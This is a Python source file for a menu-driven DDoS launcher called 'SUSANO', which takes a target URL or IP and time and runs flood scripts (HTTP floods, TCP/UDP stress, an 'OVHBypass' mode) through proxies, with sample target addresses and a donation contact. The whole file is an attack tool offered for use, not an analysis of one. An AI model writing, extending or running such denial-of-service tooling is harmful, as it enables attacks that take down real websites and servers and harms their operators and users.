from colorama import Fore, Back, Style
import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(Fore.GREEN + """
  ******** **     **  ********     **     ****     **   *******  
 **////// /**    /** **//////     ****   /**/**   /**  **/////** 
/**       /**    /**/**          **//**  /**//**  /** **     //**
/*********/**    /**/*********  **  //** /** //** /**/**      /**
////////**/**    /**////////** **********/**  //**/**/**      /**
       /**/**    /**       /**/**//////**/**   //****//**     ** 
 ******** //*******  ******** /**     /**/**    //*** //*******  
////////   ///////  ////////  //      // //      ///   ///////     by NgThanhVinh
                                           """)
    time.sleep(1.8)
    clear()

def si():
    print("Zalo/Call: 0927423139")
    print("Information: NgThanhVinh")

def menu():
    sys.stdout.write(f" DDoS Update Lần 2. ")
    clear()
    print('SUSANO DDoS By NgThanhVinh')
    print("   Không Tấn Công Chính Phủ Việt Nam. Cảm Ơn !")
    print(Fore.RED + """
 
                     ╔═╗╦ ╦╔═╗╔═╗╔╗╔╔═╗                 
            ║        ╚═╗║ ║╚═╗╠═╣║║║║ ║       ║           
            ║        ╚═╝╚═╝╚═╝╩ ╩╝╚╝╚═╝       ║          
  ╔═════════╩═════════════════════════════════╩═════════╗                           
          ══╦═════════════════════════════════╦══
  ╔═════════╩═════════════════════════════════╩═════════╗
  ╔═════════╩═════════════════════════════════╩═════════╗
  ║     Sever      ║     WELCOME     ║    stress        ║
  ║  http-socket   ║    Donate Me    ║   http-rand      ║
  ║    http-raw    ║ MoMo:0927423139 ║   OVHBypass      ║
  ║  http-requests ║ Thank For Using ║     FLOOD        ║
  ╚═════════════════════════════════════════════════════╝
 
""")

def main():
    menu()
    while(True):
        cnc = input('''Lựa Chọn Đi Bạn :''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            ()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            ()
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            ()
        elif cnc == "special" or cnc == "SPECIAL" or cnc == "specialS" or cnc == "SPECIALS":
            ()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            ()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            ()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            ()
        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
            ()

        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP-SOCKET.js {url} {per} {time}')
            except IndexError:
                print(Fore.RED +'Usage: http-socket <url> <per> <time>')
                print(Fore.RED +'Example: http-socket http://ngthanhvinh.info/ 5000 60')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW.js {url} {time}')
            except IndexError:
                print(Fore.RED +'Usage: http-raw <url> <time>')
                print(Fore.RED +'Example: http-raw http://ngthanhvinh.info/ 60')

        elif "http-requests" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-REQUESTS.js {url} {time}')
            except IndexError:
                print(Fore.RED +'Usage: http-requests <url> <time>')
                print(Fore.RED +'Example: http-requests http://ngthanhvinh.info/ 60')

        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print(Fore.RED +'Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print(Fore.RED +'MODE: [1] TCP')
                print(Fore.RED +'      [2] UDP')
                print(Fore.RED +'      [3] HTTP')
                print(Fore.RED +'Example: stress 1.1.1.1 80/443 3 1250 60 5')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print(Fore.RED +'Usage: http-rand <url> <time>')
                print(Fore.RED +'Example: http-rand http://ngthanhvinh.info/ 60')

        elif "OVHBypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node OVHBypass.js {url} {time}')
            except IndexError:
                print(Fore.RED +'Usage: OVHBypass <url> <time>')
                print(Fore.RED +'Example: OVHBypass http://ngthanhvinh.info/ 60')

        elif "FLOOD" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node FLOOD.js {url} {time}')
            except IndexError:
                print(Fore.RED +'Usage: FLOOD <url> <time>')
                print(Fore.RED +'Example: FLOOD http://ngthanhvinh.info/ 60')
 
        elif "tcp" in cnc or "TCP" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                threads = cnc.split()[4]
                os.system(f'python tcp.pl -i {ip} -p {port} -t {time} -th {threads}')
            except IndexError:
                print(Fore.RED +'Usage: tcp <ip> <port> <time> <threads>')
                print(Fore.RED +'Example: tcp 45.142.122.104 22 60 15000')

        elif "sever" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run sever.go -site {url} -data {method}')
            except IndexError:
                print(Fore.RED +'Usage: sever <url> METHODS<GET/POST>')
                print(Fore.RED +'Example: sever http://ngthanhvinh.info/ GET')

        elif "info" in cnc:
            print(f'''
    [NgThanhVinh]
            ''')
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
main()
